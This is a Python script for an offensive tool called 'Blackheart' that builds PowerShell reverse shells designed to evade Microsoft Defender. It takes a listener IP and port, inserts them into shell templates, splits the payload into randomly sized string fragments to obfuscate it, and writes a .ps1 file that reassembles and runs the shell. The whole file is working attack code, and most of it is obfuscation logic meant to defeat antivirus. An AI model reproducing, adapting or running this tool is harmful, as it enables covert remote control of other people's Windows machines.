#!/usr/bin/python3

import os
import sys
import random
import argparse

try:
    from rich import print
except:
    print("Error: >rich< module not found.")
    sys.exit(1)

# Legends
infoS = f"[bold cyan][[bold red]*[bold cyan]][white]"
foundS = f"[bold cyan][[bold red]+[bold cyan]][white]"
errorS = f"[bold cyan][[bold red]![bold cyan]][white]"

# Arguments
parser = argparse.ArgumentParser(description="Blackheart - Pop reverse shells without Microsoft Defender restrictions.")
parser.add_argument("--lhost", help="Your IP address for reverse connections.", required=True)
parser.add_argument("--lport", help="Your port for reverse connections.", required=True)
args = parser.parse_args()

# Shell templates (Powershell)
templates = open("Needs/templates.txt", "r").readlines()

# Removing old file
if os.path.exists("shfile.ps1"):
    print(f"{infoS} Removing old [bold green]shfile.ps1[white] file...")
    os.remove("shfile.ps1")

# Creating template file "ps1"
print(f"{infoS} Configurating shell template file...")
shdat = open("Needs/mini-reverse.ps1", "rt")
dat = shdat.read()
dat = dat.replace("REPLACE_H", args.lhost).replace("REPLACE_P", args.lport)
shdat.close()
shdat = open("Needs/mini-reverse.ps1", "wt")
shdat.write(dat)
shdat.close()
print(f"{foundS} Shell template file configured.")
print(f"{infoS} Creating template file [bold green]shfile.ps1[white]...")
shtemp = random.choice(templates).replace('REPLACE_H', f'{args.lhost}').replace('REPLACE_P', f'{args.lport}')
print(f"{infoS} Shell length: {len(shtemp)}")
shfile = open("shfile.ps1", "w")

# Template obfuscation phase 1 (actual shell)
ph1_counter = 0
ph1_char_index = 0
ph1_temp_index = 1
for temp in range(len(shtemp)):
    if shtemp[ph1_char_index:ph1_temp_index] != "":
        shfile.write(f"$st{ph1_counter} = \"{shtemp[ph1_char_index:ph1_temp_index]}\"\n")
        ph1_counter += 1
        ph1_char_index = ph1_temp_index
        ph1_temp_index += random.randint(1, 4)
    else:
        break

# Template obfuscation phase 3 (summary)
shfile.write("$test = ")
 
# Actual shell side
for ss in range(ph1_counter):
    if ss == ph1_counter - 1:
        shfile.write(f"\"$st{ss}\"")
    else:
        shfile.write(f"\"$st{ss}\"+")

# Lets run
shfile.write("\npowershell -c $test")
shfile.close()

print(f"{foundS} Template: [bold green]shfile.ps1[white] created.")